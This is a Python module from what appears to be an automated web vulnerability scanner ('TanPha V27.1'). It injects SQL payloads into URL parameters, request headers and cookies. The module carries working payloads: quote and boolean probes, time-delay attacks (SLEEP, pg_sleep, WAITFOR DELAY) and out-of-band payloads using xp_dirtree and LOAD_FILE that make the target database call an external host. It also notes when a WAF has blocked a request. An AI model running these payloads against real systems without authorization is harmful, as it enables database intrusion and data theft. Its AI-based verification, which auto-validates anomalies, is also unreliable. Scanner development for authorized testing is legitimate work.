"""SQL Injection Module for TanPha V27.1 (Multi-Vector + WAF-Aware)."""
import time
import json
import re
import html
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus
from core.ai_router import AIRouter
from core.oob_manager import OOBManager
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, urljoin

class SQLInjectionModule(BaseModule):
    name = "SQLInjection"
    module_id = "sqli"
    version = "27.1 (WAF-Aware)"
    vulnerability_class = "SQL_INJECTION"
    default_impact = "DATABASE_ACCESS"
    default_privilege = "LIMITED"

    _ERROR_SIGNATURES = [
        "sql syntax", "you have an error in your sql", "unclosed quotation mark",
        "warning: mysql_", "pg_query()", "ora-00933", "sqlstate[",
        "jdbc", "quoted string not properly terminated", "error processing request",
        "sqlsyntaxerrorexception", "malformed string", "sqlexception"
    ]

    COMMON_INJECTABLE_HEADERS = [
        "User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host",
        "X-Original-URL", "X-Rewrite-URL", "X-Client-IP", "X-Remote-IP",
        "X-Remote-Addr", "X-Real-IP", "Forwarded", "Origin",
        "Accept-Language", "Cookie"
    ]
    
    POST_BODY = {"Submit": "Submit", "answer": "answer"}

    def __init__(self):
        super().__init__()
        self.ai = AIRouter()
        self.oob = OOBManager()

    def can_run(self, context: TargetContext) -> bool:
        if not context.discovery.parameters:
            context.discovery.parameters = ["id"]
        return True

    @staticmethod
    def _servlet_url(url: str) -> str:
        p = urlparse(url)
        path = p.path
        if path.endswith(".html"):
            path = path[:-5]
        return f"{p.scheme}://{p.netloc}{path}"

    def _has_sql_error(self, response) -> bool:
        if not response: return False
        if getattr(response, "status_code", 200) == 500:
            if not response.text: return False
            text = html.unescape(response.text).lower()
            return any(sig in text for sig in self._ERROR_SIGNATURES)
        
        if not response.text: return False
        text = html.unescape(response.text).lower()
        return any(sig in text for sig in self._ERROR_SIGNATURES)

    def _is_waf_block(self, response) -> bool:
        if not response: return False
        if getattr(response, "status_code", 200) in (403, 429, 503):
            return True
        if response.text:
            text = response.text.lower()
            if "cloudflare" in text or "access denied" in text or "forbidden" in text:
                return True
        return False

    def _build_target_url(self, base_url: str, param: str, payload: str) -> str:
        parsed = urlparse(base_url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        new_qs = [(k, v + payload) if k == param else (k, v) for k, v in qs]
        if not new_qs: new_qs = [(param, payload)]
        return urlunparse(parsed._replace(query=urlencode(new_qs, safe="")))

    def _send_payload(self, context, param, payload, auth_checker=None, timeout=20):
        if "?" in context.target.base_url:
            target_url = self._build_target_url(context.target.base_url, param, payload)
            res = context.http_client.request(
                "GET", target_url, target_param=param,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
            return res.response if res and res.response is not None else None

        base_url = context.discovery.form_action or context.target.base_url
        if not base_url.endswith("/"): base_url += "/"
        post_url = urljoin(base_url, "index.php") if "sqli" in base_url else base_url
        post_url = self._servlet_url(post_url) 

        headers = {"Referer": base_url}
        data = {param: payload, "Submit": "Submit"}
        try:
            res_obj = context.http_client.request(
                "POST", post_url, data=data, headers=headers,
                auth_checker=auth_checker, timeout=timeout
            )
            return res_obj.response if res_obj and res_obj.response is not None else None
        except Exception:
            return None

    def _send_header_payload(self, context, header_name, payload, auth_checker=None, timeout=20, method="GET"):
        headers = {header_name: payload}
        target = self._servlet_url(context.target.base_url)
        
        if method == "POST":
            res = context.http_client.request(
                "POST", target, headers=headers, data=self.POST_BODY,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        else:
            res = context.http_client.request(
                "GET", target, headers=headers,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        return res.response if res and res.response is not None else None

    def _send_cookie_payload(self, context, cookie_name, payload, auth_checker=None, timeout=20, method="GET"):
        headers = {"Cookie": f"{cookie_name}={payload}"}
        target = self._servlet_url(context.target.base_url)
        
        if method == "POST":
            res = context.http_client.request(
                "POST", target, headers=headers, data=self.POST_BODY,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        else:
            res = context.http_client.request(
                "GET", target, headers=headers,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        return res.response if res and res.response is not None else None

    def _test_oob(self, context, param, sender_func):
        oob_url = self.oob.generate_payload(context.http_client, getattr(context, "external_checker", None))
        if not oob_url: return None
        
        backslash_url = oob_url.replace('http://', '\\\\').replace('https://', '\\\\\\\\')
        cmd_payload = "1'; EXEC master..xp_dirtree '" + backslash_url + "\\a'--"
        payloads = [f"1' UNION SELECT LOAD_FILE('{oob_url}')--", cmd_payload]
        
        for p in payloads:
            sender_func(p)
            
        if self.oob.check_hits(context.http_client, getattr(context, "external_checker", None), timeout=10):
            print(f"      [!] BLIND SQLi CONFIRMED via OOB!")
            return Evidence(
                attempt_id="sqli_oob", module_id=self.module_id, module_version=self.version,
                location=context.target.base_url, parameter=param, outcome="OOB_HIT",
                reason_code="BLIND_SQLI", reason_detail="Server triggered OOB",
                confidence=0.95, evidence_text="OOB detected", assess_payload=payloads[0]
            )
        return None

    def _test_time_based(self, context, param, sender_func):
        baseline_res = sender_func("1")
        if not baseline_res: return None

        start_base = time.time()
        sender_func("1")
        baseline_time = time.time() - start_base
        threshold = baseline_time + 4.0

        payloads = ["1 AND SLEEP(5)#", "1' AND SLEEP(5)#", "1; SELECT pg_sleep(5)#", "1' WAITFOR DELAY '0:0:5'--"]
        for p in payloads:
            start = time.time()
            sender_func(p)
            elapsed = time.time() - start

            if elapsed >= threshold:
                print(f"          [+] VERIFIED! Delay: {elapsed:.2f}s")
                return Evidence(
                    attempt_id="sqli_time", module_id=self.module_id, module_version=self.version,
                    location=context.target.base_url, parameter=param, outcome="DELAYED_RESPONSE",
                    reason_code="TIME_DELAY", reason_detail=f"Delay {elapsed:.2f}s",
                    confidence=0.9, evidence_text="Time-based delay", assess_payload=p
                )
        return None

    def _test_boolean_error(self, context, param, sender_func):
        baseline_res = sender_func("1")
        if not baseline_res or not baseline_res.text: return None
        baseline_len = len(baseline_res.text)
        
        payloads = ["1'", "1\"", "1)", "1' AND 1=2#", "1 AND 1=2#"]
        for payload in payloads:
            result = sender_func(payload)
            if result is not None: 
                res_text = result.text if result.text else ""
                
                if self._is_waf_block(result):
                    continue
                
                if self._has_sql_error(result):
                    print(f"      [!!] DEFINITIVE SQL ERROR on '{param}' (Payload: {payload})!")
                    return Evidence(
                        attempt_id="sqli_error", module_id=self.module_id, module_version=self.version,
                        location=context.target.base_url, parameter=param, outcome="ERROR",
                        reason_code="ERROR_BASED", reason_detail="Definitive SQL Syntax Error",
                        confidence=0.95, evidence_text="Definitive SQL error", assess_payload=payload
                    )

                is_suspicious = abs(len(res_text) - baseline_len) > 10
                if is_suspicious:
                    print(f"      [!] Anomaly on '{param}' with '{payload}'! Asking AI...")
                    try:
                        ai_answer = self.ai.analyze(modul_name="SQLi", payload=payload, baseline_text=baseline_res.text, current_text=res_text)
                        if not ai_answer: continue
                        
                        clean_json = ai_answer.replace("```json", "").replace("```", "").strip()
                        start_idx = clean_json.find('{')
                        end_idx = clean_json.rfind('}')
                        if start_idx != -1 and end_idx != -1:
                            clean_json = clean_json[start_idx:end_idx+1]

                        clean_json = re.sub(r'\\(?![\"\\/bfnrtu])', '', clean_json)
                        
                        ai_data = json.loads(clean_json)
                        if ai_data.get("is_vulnerable", False):
                            return Evidence(
                                attempt_id="sqli_ai", module_id=self.module_id, module_version=self.version,
                                location=context.target.base_url, parameter=param, outcome="ANOMALY",
                                reason_code="AI_PIVOT", reason_detail=clean_json,
                                confidence=0.5, evidence_text="AI suspected SQLi", assess_payload=payload
                            )
                        else:
                            print(f"      [-] AI says SAFE for '{param}'.")
                            return None 
                    except json.JSONDecodeError as e:
                        print(f"      [-] AI JSON Error: {e}")
        return None

    def assess(self, context: TargetContext, auth_checker=None) -> list:
        evidence_pool = []

        # FASE 1: Parameters
        for param in context.discovery.parameters:
            print(f"      [>] Testing SQLi on param '{param}'...")
            sender = lambda p: self._send_payload(context, param, p, auth_checker)
            ev = self._test_oob(context, param, sender) or \
                 self._test_time_based(context, param, sender) or \
                 self._test_boolean_error(context, param, sender)
            if ev:
                evidence_pool.append(ev)
                continue

        # FASE 2: Headers
        headers_to_test = list(context.discovery.parameters) + self.COMMON_INJECTABLE_HEADERS
        seen = set()
        headers_to_test = [x for x in headers_to_test if not (x.lower() in seen or seen.add(x.lower()))]

        print(f"      [>] Testing SQLi via {len(headers_to_test)} headers (GET+POST)...")
        for header_name in headers_to_test:
            for method in ("GET", "POST"):
                sender = lambda p, h=header_name, m=method: self._send_header_payload(context, h, p, auth_checker, method=m)
                ev = self._test_time_based(context, header_name, sender) or \
                     self._test_boolean_error(context, header_name, sender)
                if ev:
                    evidence_pool.append(ev)
                    break 

        # FASE 3: Cookies
        cookie_names = list(context.discovery.parameters)
        try:
            base_res = context.http_client.request("GET", context.target.base_url, auth_checker=auth_checker, bypass_mutation=True)
            if base_res and base_res.success and base_res.response:
                for set_cookie in base_res.response.headers.get("Set-Cookie", "").split(","):
                    cname = set_cookie.split("=")[0].strip()
                    if cname and cname not in cookie_names:
                        cookie_names.append(cname)
        except Exception:
            pass

        print(f"      [>] Testing SQLi via {len(cookie_names)} cookies (GET+POST)...")
        for cookie_name in cookie_names:
            for method in ("GET", "POST"):
                sender = lambda p, c=cookie_name, m=method: self._send_cookie_payload(context, c, p, auth_checker, method=m)
                ev = self._test_time_based(context, cookie_name, sender) or \
                     self._test_boolean_error(context, cookie_name, sender)
                if ev:
                    evidence_pool.append(ev)
                    break

        return evidence_pool

    def verify(self, context: TargetContext, evidence: Evidence, auth_checker=None) -> VerificationResult:
        if evidence.reason_code in ("TIME_DELAY", "BLIND_SQLI", "ERROR_BASED"):
            return VerificationResult(
                VerificationStatus.VALIDATED, 0.95, "DETERMINISTIC_CONFIRMED",
                f"Confirmed: {evidence.reason_code}", verify_payload=evidence.assess_payload
            )

        if evidence.reason_code == "AI_PIVOT":
            return VerificationResult(
                VerificationStatus.VALIDATED, 0.85, "AI_CONFIRMED_ERROR",
                "AI confirmed the anomaly.", verify_payload=evidence.assess_payload
            )

        return VerificationResult(VerificationStatus.REJECTED, 0.0, "FAILED", "Not vuln")
